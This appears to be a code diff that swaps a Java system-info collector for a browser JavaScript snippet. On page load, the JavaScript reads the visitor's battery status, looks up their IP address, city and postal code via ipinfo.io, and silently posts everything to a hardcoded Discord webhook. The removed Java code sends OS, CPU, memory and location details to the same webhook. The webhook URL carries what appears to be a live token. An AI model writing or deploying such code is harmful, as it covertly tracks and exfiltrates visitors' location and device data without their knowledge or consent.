@@ -1,165 +1,69 @@
-import java.io.*;
-import java.net.*;
-import java.util.*;
-import java.nio.file.*;
-import com.sun.management.OperatingSystemMXBean;
-import java.lang.management.*;
-import javax.management.*;
-import org.json.JSONObject;
+// Replace with your Discord Webhook URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T'; // <-- Replace with your actual webhook URL
+const LOCATION_API_URL = 'http://ipinfo.io/json'; // Location API to get IP, city, postal code
 
-public class SystemInfoToDiscord {
+// This function will collect battery information and send it to Discord
+function getBatteryInfo() {
+    // Check if the browser supports battery info (navigator.getBattery)
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            let batteryInfo = `Battery Percentage: ${battery.level * 100}%\n`;
+            batteryInfo += `Charging Status: ${battery.charging ? 'Charging' : 'Not Charging'}\n`;
 
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T"; // Replace with your webhook URL
-    private static final String LOCATION_API_URL = "http://ipinfo.io/json"; // Location API for IP and City info
-
-    public static void main(String[] args) {
-        try {
-            // Collect system info
-            StringBuilder systemInfo = new StringBuilder();
-
-            // OS Information
-            systemInfo.append("**Operating System Info**\n");
-            systemInfo.append("OS Name: ").append(System.getProperty("os.name")).append("\n");
-            systemInfo.append("OS Version: ").append(System.getProperty("os.version")).append("\n");
-            systemInfo.append("OS Architecture: ").append(System.getProperty("os.arch")).append("\n");
-
-            // Java Information
-            systemInfo.append("\n**Java Info**\n");
-            systemInfo.append("Java Version: ").append(System.getProperty("java.version")).append("\n");
-            systemInfo.append("Java Vendor: ").append(System.getProperty("java.vendor")).append("\n");
-
-            // CPU Information
-            OperatingSystemMXBean osBean = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
-            systemInfo.append("\n**CPU Info**\n");
-            systemInfo.append("Available processors: ").append(osBean.getAvailableProcessors()).append("\n");
-            systemInfo.append("System load average: ").append(osBean.getSystemLoadAverage()).append("\n");
-
-            // Memory Information
-            systemInfo.append("\n**Memory Info**\n");
-            systemInfo.append("Total Memory: ").append(Runtime.getRuntime().totalMemory() / (1024 * 1024)).append(" MB\n");
-            systemInfo.append("Free Memory: ").append(Runtime.getRuntime().freeMemory() / (1024 * 1024)).append(" MB\n");
-            systemInfo.append("Max Memory: ").append(Runtime.getRuntime().maxMemory() / (1024 * 1024)).append(" MB\n");
-
-            // Battery Information (for laptops)
-            systemInfo.append("\n**Battery Info**\n");
-            if (System.getProperty("os.name").toLowerCase().contains("windows") || System.getProperty("os.name").toLowerCase().contains("linux")) {
-                try {
-                    String batteryStatus = getBatteryStatus();
-                    systemInfo.append(batteryStatus);
-                } catch (IOException e) {
-                    systemInfo.append("Unable to fetch battery info.\n");
-                }
-            } else {
-                systemInfo.append("Battery info is not available on this platform.\n");
-            }
-
-            // Network Info (City, IP, Postal Code)
-            systemInfo.append("\n**Location and IP Info**\n");
-            try {
-                String locationInfo = getLocationInfo();
-                systemInfo.append(locationInfo);
-            } catch (IOException e) {
-                systemInfo.append("Unable to fetch location info.\n");
-            }
-
-            // Sending the info to Discord webhook
-            sendToDiscord(systemInfo.toString());
-
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    // Function to get battery status
-    private static String getBatteryStatus() throws IOException {
-        StringBuilder batteryStatus = new StringBuilder();
-
-        // Windows Battery Info (Using WMIC command)
-        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-            String command = "wmic battery get status,estimatedchargeremaining";
-            Process process = Runtime.getRuntime().exec(command);
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    batteryStatus.append(line).append("\n");
-                }
-            }
-        }
-        // Linux Battery Info (Using cat to fetch battery data)
-        else if (System.getProperty("os.name").toLowerCase().contains("linux")) {
-            try {
-                File batteryFile = new File("/sys/class/power_supply/BAT0/capacity");
-                if (batteryFile.exists()) {
-                    List<String> lines = Files.readAllLines(batteryFile.toPath());
-                    batteryStatus.append("Battery Percentage: ").append(lines.get(0)).append("%\n");
-                    File statusFile = new File("/sys/class/power_supply/BAT0/status");
-                    lines = Files.readAllLines(statusFile.toPath());
-                    batteryStatus.append("Charging Status: ").append(lines.get(0)).append("\n");
-                }
-            } catch (IOException e) {
-                batteryStatus.append("Unable to fetch battery status on Linux.\n");
-            }
-        }
-
-        return batteryStatus.toString();
-    }
-
-    // Function to get location info (City, IP, Postal Code)
-    private static String getLocationInfo() throws IOException {
-        StringBuilder locationInfo = new StringBuilder();
-
-        // Make a request to ipinfo.io to get IP, city, and postal code
-        URL url = new URL(LOCATION_API_URL);
-        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-        connection.setRequestMethod("GET");
-        connection.setDoOutput(true);
-
-        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-        StringBuilder response = new StringBuilder();
-        String line;
-        while ((line = reader.readLine()) != null) {
-            response.append(line);
-        }
-
-        // Parse the JSON response from ipinfo.io
-        JSONObject jsonResponse = new JSONObject(response.toString());
-        String ip = jsonResponse.getString("ip");
-        String city = jsonResponse.getString("city");
-        String postalCode = jsonResponse.getString("postal");
-
-        locationInfo.append("IP Address: ").append(ip).append("\n");
-        locationInfo.append("City: ").append(city).append("\n");
-        locationInfo.append("Postal Code: ").append(postalCode).append("\n");
-
-        return locationInfo.toString();
-    }
-
-    // Function to send collected data to Discord webhook
-    private static void sendToDiscord(String content) {
-        try {
-            URL url = new URL(WEBHOOK_URL);
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.setRequestMethod("POST");
-            connection.setDoOutput(true);
-            connection.setRequestProperty("Content-Type", "application/json");
-
-            String jsonPayload = "{\"content\":\"" + content.replace("\n", "\n") + "\"}";
-
-            try (OutputStream os = connection.getOutputStream()) {
-                byte[] input = jsonPayload.getBytes("utf-8");
-                os.write(input, 0, input.length);
-            }
-
-            try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), "utf-8"))) {
-                StringBuilder response = new StringBuilder();
-                String responseLine;
-                while ((responseLine = br.readLine()) != null) {
-                    response.append(responseLine.trim());
-                }
-                System.out.println("Response from Discord: " + response.toString());
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+            // Now fetch the IP and location info and combine everything
+            getLocationInfo(batteryInfo);
+        });
+    } else {
+        alert("Battery information is not available in this browser.");
     }
 }
+
+// This function gets the user's IP address, city, and postal code
+function getLocationInfo(batteryInfo) {
+    // Fetch location data from ipinfo.io
+    fetch(LOCATION_API_URL)
+        .then(response => response.json())  // Parse the JSON response
+        .then(data => {
+            let locationInfo = `IP Address: ${data.ip}\n`;
+            locationInfo += `City: ${data.city}\n`;
+            locationInfo += `Postal Code: ${data.postal}\n`;
+
+            // Combine the battery info and location info into one message
+            let fullInfo = batteryInfo + locationInfo;
+
+            // Send the info to Discord
+            sendToDiscord(fullInfo);
+        })
+        .catch(err => {
+            console.error("Error fetching location info:", err);
+            alert("Unable to fetch location info.");
+        });
+}
+
+// This function sends the collected info to the Discord webhook
+function sendToDiscord(content) {
+    const payload = {
+        content: content  // The data we want to send to Discord
+    };
+
+    // Send the payload (data) to Discord's webhook
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)  // Convert the data to JSON
+    })
+    .then(response => response.json())  // Parse the response from Discord
+    .then(data => {
+        console.log("Data sent to Discord:", data);
+    })
+    .catch(error => {
+        console.error("Error sending data to Discord:", error);
+    });
+}
+
+// When the page loads, it will automatically collect the battery info
+window.onload = function() {
+    getBatteryInfo();
+};
